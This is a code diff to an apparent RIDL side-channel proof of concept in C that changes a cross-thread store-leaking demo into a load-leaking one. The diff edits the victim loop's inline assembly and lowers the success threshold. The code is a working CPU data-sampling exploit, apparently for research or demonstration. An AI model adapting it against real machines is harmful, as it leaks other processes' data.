@@ -20,19 +20,15 @@ int hits[256];
 inline void *test_write(uint64_t value) {
     set_processor_affinity(writer_cpu);
     uint64_t *destination = aligned_alloc(_page_size, _page_size);
+    destination[0] = value;
     asm volatile(
     "ridl_victim_loop:\n"
-    "movq %0, (%1)\n"
+    "movq (%0), %%rbx\n"
+    "xor %%rbx, %%rbx\n"
     "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq $0, (%1)\n"
-    "mfence\n"
-    "clflush (%1)\n"
+    "clflush (%0)\n"
     "jmp ridl_victim_loop"
-    ::"r"(value), "r"(destination));
+    ::"r"(destination));
 }
 
 void test_read(void *mem) {
@@ -51,7 +47,7 @@ void test_read(void *mem) {
 
 
 int main() {
-    printf("Demo 1: Cross-Thread Store Leaking\n");
+    printf("Demo 2: Cross-Thread Load Leaking\n");
     _page_size = getpagesize();
     uint8_t *mem =
             mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
@@ -68,7 +64,7 @@ int main() {
             max = hits[i];
         }
     }
-    if (max_i == WRITE_VALUE && max > (float) REPS / 100.0) {
+    if (max_i == WRITE_VALUE && max > (float) REPS / 500.0) {
         printf("The expected value was successfully leaked.\nSuccess rate: %.2f%%\n", (100 * max) / ((double) REPS));
     } else {
         printf("The expected value was not leaked.\n");
@@ -79,4 +75,3 @@ int main() {
     ridl_cleanup();
     return 0;
 }
-
